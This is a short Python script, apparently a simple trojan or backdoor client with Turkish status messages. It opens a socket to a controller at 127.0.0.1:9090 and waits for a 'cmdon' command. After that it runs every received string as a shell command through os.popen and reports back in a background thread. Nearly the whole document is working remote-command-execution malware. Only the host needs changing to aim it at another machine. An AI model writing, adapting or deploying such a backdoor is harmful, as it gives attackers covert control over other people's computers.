import socket
import threading
import os
import time

def trojan():
    HOST = '127.0.0.1'
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "cmdon":
            cmd_mode=True
            client.send("Artık terminaldeyiz".encode('utf-8'))
            continue
        if cmd_mode:
            os.popen(server_command)
            time.sleep(10)
        client.send(f"{server_command} Başarıyla baglandı & komut işlendi".encode('utf-8'))

t1= threading.Thread(target=trojan)
t1.start()